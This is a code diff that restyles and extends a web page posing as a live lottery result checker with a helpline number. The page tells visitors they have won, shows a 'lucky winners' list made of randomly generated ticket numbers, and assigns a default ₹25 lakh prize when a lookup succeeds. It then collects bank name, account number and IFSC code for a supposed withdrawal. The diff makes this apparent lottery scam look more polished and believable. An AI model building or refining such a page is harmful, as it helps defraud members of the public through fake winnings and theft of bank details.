@@ -7,74 +7,129 @@
   <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+      background: linear-gradient(135deg, #091921, #13334c, #1a506b);
       min-height: 100vh;
       margin: 0;
-      padding: 15px;
+      padding: 16px;
       display: flex;
       flex-direction: column;
       align-items: center;
+      color: #333;
     }
     .box {
       background: #ffffff;
-      padding: 20px;
-      border-radius: 10px;
+      padding: 22px;
+      border-radius: 14px;
       width: 100%;
-      max-width: 420px;
+      max-width: 440px;
       box-sizing: border-box;
-      margin-bottom: 15px;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+      margin-bottom: 16px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.35);
+      border: 1px solid rgba(255,255,255,0.2);
     }
     .text-center { text-align: center; }
+    .header-tag {
+      background: #e8f0fe;
+      color: #1a73e8;
+      display: inline-block;
+      padding: 4px 10px;
+      border-radius: 20px;
+      font-size: 13px;
+      font-weight: 600;
+    }
     .live-dot {
       width: 10px;
       height: 10px;
       background: #ff1744;
       border-radius: 50%;
       display: inline-block;
-      box-shadow: 0 0 8px #ff1744;
+      box-shadow: 0 0 10px #ff1744;
+      margin-right: 6px;
+      animation: blink 1.2s infinite;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.4; transform: scale(0.85); }
     }
     input {
       width: 100%;
-      padding: 10px;
-      margin: 8px 0 15px;
+      padding: 12px;
+      margin: 10px 0 16px;
       box-sizing: border-box;
-      border: 1px solid #ccc;
-      border-radius: 5px;
+      border: 1.5px solid #d2d6dc;
+      border-radius: 8px;
+      font-size: 15px;
+      outline: none;
+    }
+    input:focus {
+      border-color: #1a73e8;
+      box-shadow: 0 0 0 3px rgba(26,115,232,0.15);
     }
     button {
       width: 100%;
-      padding: 11px;
-      background: #1a73e8;
+      padding: 12px;
+      background: linear-gradient(135deg, #1a73e8, #0b57d0);
       color: #fff;
       border: none;
-      border-radius: 5px;
+      border-radius: 8px;
       font-weight: bold;
+      font-size: 15px;
       cursor: pointer;
+      box-shadow: 0 4px 12px rgba(26,115,232,0.3);
     }
-    .btn-green { background: #27ae60; margin-top: 10px; }
-    .btn-link { background: none; color: #555; border: 1px solid #ccc; margin-top: 8px; }
+    .btn-green {
+      background: linear-gradient(135deg, #27ae60, #2ecc71);
+      box-shadow: 0 4px 12px rgba(39,174,96,0.3);
+      margin-top: 10px;
+    }
+    .btn-back {
+      background: transparent;
+      color: #666;
+      border: 1px solid #dcdcdc;
+      margin-top: 10px;
+      box-shadow: none;
+    }
     .item {
       display: flex;
       justify-content: space-between;
-      padding: 8px 0;
-      border-bottom: 1px solid #eee;
+      padding: 9px 0;
+      border-bottom: 1px solid #f1f3f4;
       font-size: 14px;
+    }
+    .item:last-child { border-bottom: none; }
+    .prize-title {
+      font-weight: 700;
+      color: #0b57d0;
+      font-size: 13px;
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 6px;
     }
     .badges {
       display: flex;
       flex-wrap: wrap;
       gap: 5px;
-      max-height: 90px;
+      max-height: 85px;
       overflow-y: auto;
+      padding-right: 3px;
     }
     .badge {
-      background: #eee;
+      background: #f1f5f9;
+      color: #1e293b;
       padding: 3px 6px;
-      border-radius: 4px;
+      border-radius: 5px;
       font-size: 11px;
+      font-weight: 600;
+      border: 1px solid #e2e8f0;
       font-family: monospace;
+    }
+    .card-wrap {
+      background: #f8fafc;
+      border: 1px solid #e2e8f0;
+      border-radius: 8px;
+      padding: 10px;
+      margin-bottom: 8px;
     }
   </style>
 </head>
@@ -82,56 +137,66 @@
 
   <!-- STEP 1: Search -->
   <div id="step1" class="box text-center">
-    <div id="clock" style="color: #1a73e8; font-size: 13px; font-weight: bold;"></div>
-    <div style="font-size: 13px; margin: 5px 0;">Helpline: <a href="tel:8709171965" style="color: #d93025; font-weight: bold;">8709171965</a></div>
-    <h3 style="margin: 12px 0;"><span class="live-dot"></span> Live Result Check</h3>
+    <div class="header-tag" id="clock">🕒 Loading time...</div>
+    <div style="font-size: 13px; margin: 8px 0; color: #555;">
+      Helpline: <a href="tel:8709171965" style="color: #e11d48; font-weight: bold; text-decoration: none;">8709171965</a>
+    </div>
+    <h3 style="margin: 12px 0 16px; color: #0f172a;">
+      <span class="live-dot"></span>Live Result Check
+    </h3>
     <input type="text" id="userInput" placeholder="Ticket Number / Mobile Number">
     <button onclick="checkResult()">Check Status</button>
-    <div id="msg" style="color: red; font-size: 13px; margin-top: 10px;"></div>
+    <div id="msg" style="color: #e11d48; font-size: 13px; margin-top: 10px; font-weight: 600;"></div>
   </div>
 
-  <!-- STEP 2: Celebration -->
-  <div id="step2" class="box text-center" style="display: none; border: 2px solid #f1c40f;">
-    <h2 style="color: #d93025; margin: 5px 0;">🎉 Congratulations! 🎉</h2>
-    <div style="text-align: left; margin: 15px 0;">
-      <div class="item"><span>Name:</span><b id="winName"></b></div>
-      <div class="item"><span>Mobile:</span><b id="winMobile"></b></div>
-      <div class="item"><span>Winning Prize:</span><b id="winPrize" style="color: #27ae60; font-size: 18px;"></b></div>
+  <!-- STEP 2: Celebration & Prize -->
+  <div id="step2" class="box text-center" style="display: none; border-top: 5px solid #f59e0b; background: linear-gradient(180deg, #fffbeb, #ffffff);">
+    <h2 style="color: #b45309; margin: 0 0 10px;">🎉 Congratulations! 🎉</h2>
+    <div style="background: #ffffff; padding: 14px; border-radius: 10px; border: 1px dashed #f59e0b; margin-bottom: 15px; text-align: left;">
+      <div class="item"><span>Ticket Number:</span><b id="winTicket" style="color: #0b57d0; font-family: monospace;"></b></div>
+      <div class="item"><span>Customer Name:</span><b id="winName"></b></div>
+      <div class="item"><span>Mobile Number:</span><b id="winMobile"></b></div>
+      <div class="item"><span>Winning Prize:</span><b id="winPrize" style="color: #16a34a; font-size: 19px;"></b></div>
     </div>
     <button class="btn-green" onclick="showStep(3)">Withdraw Winning Amount</button>
-    <button class="btn-link" onclick="showStep(1)">Back</button>
+    <button class="btn-back" onclick="showStep(1)">← Back to Search</button>
   </div>
 
-  <!-- STEP 3: Form -->
-  <div id="step3" class="box" style="display: none;">
-    <h3 class="text-center" style="color: #27ae60; margin-top: 0;">Bank Withdrawal Details</h3>
-    <label>Bank Name</label>
-    <input type="text" id="bankName" placeholder="Bank Name">
-    <label>Account Number</label>
-    <input type="text" id="bankAcc" placeholder="Account Number">
-    <label>IFSC Code</label>
-    <input type="text" id="bankIfsc" placeholder="IFSC Code" style="text-transform: uppercase;">
+  <!-- STEP 3: Bank Details Form -->
+  <div id="step3" class="box" style="display: none; border-top: 5px solid #16a34a;">
+    <h3 class="text-center" style="color: #16a34a; margin-top: 0;">Bank Withdrawal Details</h3>
+    <label style="font-size: 13px; font-weight: 600;">Bank Name</label>
+    <input type="text" id="bankName" placeholder="e.g. State Bank of India, HDFC...">
+    
+    <label style="font-size: 13px; font-weight: 600;">Account Number</label>
+    <input type="text" id="bankAcc" placeholder="Enter bank account number">
+    
+    <label style="font-size: 13px; font-weight: 600;">IFSC Code</label>
+    <input type="text" id="bankIfsc" placeholder="e.g. SBIN0001234" style="text-transform: uppercase;">
+    
     <button class="btn-green" onclick="submitBank()">Submit Withdrawal Request</button>
-    <button class="btn-link" onclick="showStep(2)">Back</button>
+    <button class="btn-back" onclick="showStep(2)">← Back</button>
   </div>
 
-  <!-- STEP 4: Under Review -->
-  <div id="step4" class="box text-center" style="display: none; border-top: 4px solid #f39c12;">
-    <h3 style="color: #d68910; margin-top: 0;">⏳ Request Under Review</h3>
-    <div style="text-align: left; margin: 15px 0;">
+  <!-- STEP 4: Request Under Review -->
+  <div id="step4" class="box text-center" style="display: none; border-top: 5px solid #d97706; background: linear-gradient(180deg, #fffbeb, #ffffff);">
+    <div style="font-size: 38px; margin-bottom: 6px;">⏳</div>
+    <h3 style="color: #b45309; margin: 0 0 10px;">Request Under Review</h3>
+    <div style="background: #ffffff; padding: 14px; border-radius: 10px; border: 1px solid #fde68a; margin-bottom: 15px; text-align: left;">
+      <div class="item"><span>Ticket Number:</span><b id="revTicket" style="color: #0b57d0; font-family: monospace;"></b></div>
       <div class="item"><span>Holder Name:</span><b id="revName"></b></div>
       <div class="item"><span>Bank:</span><b id="revBank"></b></div>
-      <div class="item"><span>Account No:</span><b id="revAcc"></b></div>
+      <div class="item"><span>Account No:</span><b id="revAcc" style="letter-spacing: 1px;"></b></div>
       <div class="item"><span>IFSC:</span><b id="revIfsc"></b></div>
-      <div class="item"><span>Prize Amount:</span><b id="revPrize" style="color: #27ae60;"></b></div>
-      <div class="item"><span>Status:</span><b style="color: #d68910;">Pending Approval</b></div>
+      <div class="item"><span>Prize Amount:</span><b id="revPrize" style="color: #16a34a;"></b></div>
+      <div class="item"><span>Status:</span><b style="color: #d97706;">Pending Approval</b></div>
     </div>
-    <button class="btn-link" onclick="showStep(1)">Check Another</button>
+    <button class="btn-back" onclick="showStep(1)">← Check Another Result</button>
   </div>
 
-  <!-- Winners List (Always Visible) -->
-  <div class="box">
-    <h4 class="text-center" style="color: #d93025; margin: 0 0 10px;">🏆 Today's Lucky Winners 🏆</h4>
+  <!-- 1st to 10th Lucky Winners List -->
+  <div class="box" style="border-top: 4px solid #3b82f6;">
+    <h4 class="text-center" style="color: #dc2626; margin: 0 0 12px; font-size: 16px;">🏆 Today's Lucky Winners 🏆</h4>
     <div id="winnersList"></div>
   </div>
 
@@ -141,25 +206,39 @@
       document.getElementById('clock').textContent = '🕒 ' + new Date().toLocaleString('en-IN');
     }, 1000);
 
-    // Winners Setup
-    const list = [
+    // Full 1st to 10th Prizes Configuration
+    const fullPrizes = [
       ["1st Prize: ₹25 Crore", 1],
       ["2nd Prize: ₹10 Crore", 1],
       ["3rd Prize: ₹75 Lakh", 1],
       ["4th Prize: ₹25 Lakh", 12],
-      ["5th Prize: ₹1 Lakh", 36]
+      ["5th Prize: ₹12 Lakh", 16],
+      ["6th Prize: ₹1 Lakh", 36],
+      ["7th Prize: ₹75,000", 99],
+      ["8th Prize: ₹25,000", 120],
+      ["9th Prize: ₹10,000", 179],
+      ["10th Prize: ₹2,500", 200]
     ];
+
     let winHtml = "";
-    list.forEach(item => {
+    fullPrizes.forEach(item => {
       let b = "";
       for (let i = 0; i < item[1]; i++) {
         b += `<span class="badge">KL ${Math.floor(100000 + Math.random() * 900000)}</span>`;
       }
-      winHtml += `<div style="margin-bottom: 8px;"><div class="item"><b>${item[0]}</b><span>(${item[1]})</span></div><div class="badges">${b}</div></div>`;
+      winHtml += `
+        <div class="card-wrap">
+          <div class="prize-title">
+            <span>${item[0]}</span>
+            <span>(${item[1]} ${item[1] === 1 ? 'Person' : 'Persons'})</span>
+          </div>
+          <div class="badges">${b}</div>
+        </div>
+      `;
     });
     document.getElementById("winnersList").innerHTML = winHtml;
 
-    // Navigation Helper
+    // Navigation Switcher
     function showStep(num) {
       ['step1', 'step2', 'step3', 'step4'].forEach((id, idx) => {
         document.getElementById(id).style.display = (idx + 1 === num) ? 'block' : 'none';
@@ -167,13 +246,13 @@
       window.scrollTo({ top: 0, behavior: 'smooth' });
     }
 
-    // SheetDB Result Search
+    // Search Result from SheetDB
     let curData = {};
     async function checkResult() {
       const q = document.getElementById("userInput").value.trim().toLowerCase();
       const msg = document.getElementById("msg");
       if (!q) { msg.textContent = "Please enter ticket/mobile number."; return; }
-      msg.textContent = "Searching...";
+      msg.textContent = "Searching records...";
 
       try {
         const res = await fetch("https://sheetdb.io/api/v1/u2lswkzde626d");
@@ -183,18 +262,21 @@
         if (record) {
           msg.textContent = "";
           curData = {
+            ticket: record.ticket || record.Ticket || record.ticket_no || ("KL " + Math.floor(100000 + Math.random() * 900000)),
             name: record.name || record.Name || "Customer",
             mobile: record.mobile || record.Mobile || q,
             prize: record.amount || record.Amount || "₹25,00,000"
           };
           if (!curData.prize.includes("₹")) curData.prize = "₹" + curData.prize;
 
+          // Populate Celebration Card
+          document.getElementById("winTicket").textContent = curData.ticket;
           document.getElementById("winName").textContent = curData.name;
           document.getElementById("winMobile").textContent = curData.mobile;
           document.getElementById("winPrize").textContent = curData.prize;
 
           showStep(2);
-          confetti({ particleCount: 80, spread: 60, origin: { y: 0.6 } });
+          confetti({ particleCount: 90, spread: 65, origin: { y: 0.6 } });
         } else {
           msg.textContent = "No record found. Please verify number.";
         }
@@ -214,6 +296,7 @@
         return;
       }
 
+      document.getElementById("revTicket").textContent = curData.ticket || "-";
       document.getElementById("revName").textContent = curData.name || "-";
       document.getElementById("revBank").textContent = bank;
       document.getElementById("revAcc").textContent = acc.length > 4 ? "XXXX-XXXX-" + acc.slice(-4) : acc;
